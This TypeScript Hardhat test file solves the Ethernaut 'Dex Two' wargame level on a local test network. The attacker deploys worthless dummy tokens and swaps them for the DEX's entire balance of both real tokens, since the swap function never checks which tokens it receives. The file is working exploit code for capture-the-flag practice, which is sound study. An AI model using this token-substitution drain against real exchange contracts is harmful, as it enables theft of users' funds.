import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {DexTwo, SwappableTokenTwo} from '../../types/typechain';

describe('Ethernaut 22: Dex Two', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: DexTwo;
  let token1: SwappableTokenTwo;
  let token2: SwappableTokenTwo;

  const DEX_TOKEN1_BALANCE = 100;
  const DEX_TOKEN2_BALANCE = 100;
  const ATTACKER_TOKEN1_BALANCE = 10;
  const ATTACKER_TOKEN2_BALANCE = 10;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    // deploy dex first
    contract = await ethers.getContractFactory('DexTwo', owner).then(f => f.deploy());
    await contract.deployed();

    // deploy first of the two swap tokens
    token1 = await ethers
      .getContractFactory('SwappableTokenTwo', owner)
      .then(f => f.deploy(contract.address, 'Alicetoken', 'ALCTOK', 5000));
    await token1.deployed();

    // deploy second of the two swap tokens
    token2 = await ethers
      .getContractFactory('SwappableTokenTwo', owner)
      .then(f => f.deploy(contract.address, 'Bobtoken', 'BOBTOK', 5000));
    await token2.deployed();

    // register tokens to dex
    await contract.setTokens(token1.address, token2.address);

    // dex has 100 of each token
    await token1.transfer(contract.address, DEX_TOKEN1_BALANCE);
    await token2.transfer(contract.address, DEX_TOKEN2_BALANCE);

    // attacker has 10 of each token
    await token1.transfer(attacker.address, ATTACKER_TOKEN1_BALANCE);
    await token2.transfer(attacker.address, ATTACKER_TOKEN2_BALANCE);
  });

  it('should drain both tokens', async () => {
    const t1balance = await token1.balanceOf(contract.address);
    const t2balance = await token2.balanceOf(contract.address);

    // we will deploy arbitrary tokens
    const dummyToken1 = await ethers
      .getContractFactory('SwappableTokenTwo', attacker)
      .then(f => f.deploy(contract.address, 'Dummy1', 'DUM1', t1balance.mul(2)));
    const dummyToken2 = await ethers
      .getContractFactory('SwappableTokenTwo', attacker)
      .then(f => f.deploy(contract.address, 'Dummy2', 'DUM2', t2balance.mul(2)));

    // send 100 tokens to DEX
    await dummyToken1.transfer(contract.address, t1balance);
    await dummyToken2.transfer(contract.address, t2balance);

    // approve 100 tokens too
    await dummyToken1['approve(address,uint256)'](contract.address, t1balance);
    await dummyToken2['approve(address,uint256)'](contract.address, t2balance);

    // swap
    await contract.connect(attacker).swap(dummyToken1.address, token1.address, t1balance);
    await contract.connect(attacker).swap(dummyToken2.address, token2.address, t2balance);
  });

  after(async () => {
    // dex should be depleted of both tokens
    expect(await token1.balanceOf(contract.address)).to.eq(0);
    expect(await token2.balanceOf(contract.address)).to.eq(0);
  });
});
